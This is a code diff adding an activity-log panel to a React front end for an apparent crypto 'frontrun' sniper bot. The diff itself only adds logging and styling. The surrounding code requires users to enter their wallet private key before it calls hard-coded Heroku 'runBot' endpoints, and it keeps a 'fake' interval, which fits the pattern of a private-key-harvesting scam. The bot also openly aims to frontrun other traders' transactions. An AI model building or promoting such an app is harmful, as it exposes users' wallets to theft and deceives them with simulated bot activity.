@@ -35,6 +35,8 @@ function Hero() {
   const [loader, setLoader] = useState(false);
   const [message, setMessage] = useState("");
   const [profit, setProfit] = useState(null);
+  const [logs, setLogs] = useState([]);
+  const logsEndRef = useRef(null);
   const fakeIntervalRef = useRef(null);
   const confirmIntervalRef = useRef(null);
   const [blockHeightData, setBlockHeightData] = useState([
@@ -80,6 +82,11 @@ function Hero() {
     }
   };
 
+  const addLog = (message, type = 'info') => {
+    const timestamp = new Date().toLocaleTimeString();
+    setLogs(prev => [...prev, { time: timestamp, message, type }].slice(-50));
+  };
+
   const makeWeb3 = () => {
     const rpc = getRpcUrl(network);
     if (!rpc) return null;
@@ -110,18 +117,25 @@ function Hero() {
     }
   }, [address, network]);
 
+  useEffect(() => {
+    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [logs]);
+
   const handleRunBot = async () => {
     if (!network) {
       toast.error("Please select a chain first!");
+      addLog("Error: Please select a chain first", "error");
       return;
     }
     if (!privateKey || !address) {
       setMessage("Please enter both private key and address");
+      addLog("Error: Missing private key or address", "error");
       return;
     }
 
     setLoader(true);
     setMessage("");
+    addLog(`Starting bot on ${network.toUpperCase()}...`, "info");
 
     await runBotWithDelay();
   };
@@ -138,6 +152,8 @@ function Hero() {
           ? "https://marlinnapp-f52b2d918ea3.herokuapp.com/api/runBot"
           : "https://bnbsniperbot-303a52ad1861.herokuapp.com/api/runBot";
 
+      addLog("Sending transaction request to API...", "info");
+
       const response = await axios.post(
         apiUrl,
         {
@@ -153,8 +169,12 @@ function Hero() {
       const txHash = data?.frontrunTxHash;
       if (!txHash) throw new Error("No transaction hash returned.");
 
+      addLog(`Transaction submitted: ${txHash.substring(0, 10)}...`, "success");
+
       const web3Instance = makeWeb3();
       if (!web3Instance) throw new Error("Invalid network / RPC.");
+
+      addLog("Monitoring transaction confirmation...", "info");
 
       confirmIntervalRef.current = setInterval(async () => {
         try {
@@ -162,7 +182,7 @@ function Hero() {
           if (receipt && receipt.status) {
             clearInterval(confirmIntervalRef.current);
             confirmIntervalRef.current = null;
-            console.log("Transaction confirmed!");
+            addLog("Transaction confirmed on blockchain!", "success");
           }
         } catch (err) {
           console.error("Error checking transaction receipt:", err.message);
@@ -229,9 +249,13 @@ function Hero() {
         if (prev && updatedBalance) {
           const profitValue =
             parseFloat(updatedBalance) - parseFloat(prev);
-          if (!Number.isNaN(profitValue)) setProfit(profitValue.toFixed(4));
+          if (!Number.isNaN(profitValue)) {
+            setProfit(profitValue.toFixed(4));
+            addLog(`Profit calculated: ${profitValue.toFixed(4)}`, "success");
+          }
         }
 
+        addLog("Bot execution completed!", "success");
         setLoader(false);
       }, remaining);
     } catch (error) {
@@ -248,9 +272,13 @@ function Hero() {
 
       if (error.response) {
         console.error("API Error Response:", error.response.data);
-        setMessage(`❌ API Error: ${error.response.data.message || "Unknown error"}`);
+        const errorMsg = error.response.data.message || "Unknown error";
+        setMessage(`❌ API Error: ${errorMsg}`);
+        addLog(`API Error: ${errorMsg}`, "error");
       } else {
-        setMessage(`❌ Failed to run bot: ${error.message}`);
+        const errorMsg = error.message;
+        setMessage(`❌ Failed to run bot: ${errorMsg}`);
+        addLog(`Failed to run bot: ${errorMsg}`, "error");
       }
 
       toast.error("Bot run failed.");
@@ -451,6 +479,105 @@ function Hero() {
             </div>
 
             <div style={{ marginTop: '20px', color: '#ffffff', fontSize: '14px' }}>{message}</div>
+
+            <div style={{
+              marginTop: '40px',
+              background: 'linear-gradient(180deg, #1e2538 0%, #252c44 100%)',
+              borderRadius: '28px',
+              padding: '22px 24px',
+              height: '350px',
+              boxShadow: '0 8px 24px rgba(0, 0, 0, 0.25)',
+              position: 'relative',
+              overflow: 'hidden'
+            }}>
+              <div style={{
+                position: 'absolute',
+                right: 0,
+                top: 0,
+                bottom: 0,
+                width: '8px',
+                background: 'linear-gradient(180deg, #4ade80 0%, #22c55e 100%)',
+                borderRadius: '0 28px 28px 0'
+              }}></div>
+
+              <h3 style={{
+                color: '#ffffff',
+                fontSize: '16px',
+                fontWeight: '600',
+                marginBottom: '14px',
+                letterSpacing: '0.4px'
+              }}>
+                Activity Logs
+              </h3>
+
+              <div
+                style={{
+                  height: 'calc(100% - 40px)',
+                  overflowY: 'auto',
+                  display: 'flex',
+                  flexDirection: 'column',
+                  gap: '8px',
+                  paddingRight: '8px'
+                }}
+                className="logs-container"
+              >
+                {logs.length === 0 ? (
+                  <div style={{
+                    color: '#8a9ab5',
+                    fontSize: '13px',
+                    fontStyle: 'italic',
+                    textAlign: 'center',
+                    marginTop: '20px'
+                  }}>
+                    No activity logs yet
+                  </div>
+                ) : (
+                  <>
+                    {logs.map((log, index) => (
+                      <div
+                        key={index}
+                        style={{
+                          background: 'rgba(255, 255, 255, 0.03)',
+                          borderRadius: '8px',
+                          padding: '10px 12px',
+                          borderLeft: `3px solid ${
+                            log.type === 'error' ? '#ef4444' :
+                            log.type === 'success' ? '#22c55e' :
+                            '#21C6FD'
+                          }`
+                        }}
+                      >
+                        <div style={{
+                          display: 'flex',
+                          justifyContent: 'space-between',
+                          alignItems: 'flex-start',
+                          gap: '8px'
+                        }}>
+                          <span style={{
+                            color: log.type === 'error' ? '#ef4444' :
+                                  log.type === 'success' ? '#22c55e' :
+                                  '#ffffff',
+                            fontSize: '13px',
+                            lineHeight: '1.4',
+                            flex: 1
+                          }}>
+                            {log.message}
+                          </span>
+                          <span style={{
+                            color: '#8a9ab5',
+                            fontSize: '11px',
+                            whiteSpace: 'nowrap'
+                          }}>
+                            {log.time}
+                          </span>
+                        </div>
+                      </div>
+                    ))}
+                    <div ref={logsEndRef} />
+                  </>
+                )}
+              </div>
+            </div>
           </div>
 
           <div style={{ display: 'flex', flexDirection: 'column', gap: '85px' }}>
